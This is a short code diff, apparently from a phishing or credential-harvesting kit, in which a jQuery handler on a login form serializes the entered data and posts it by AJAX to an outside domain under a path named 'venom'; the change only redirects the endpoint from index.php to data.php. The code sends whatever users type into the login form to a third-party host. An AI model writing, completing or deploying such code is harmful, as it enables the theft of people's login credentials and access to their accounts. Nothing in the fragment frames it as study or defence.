@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://aditpratamaa.my.id/venom/index.php",
+        url: "http://aditpratamaa.my.id/venom/data.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
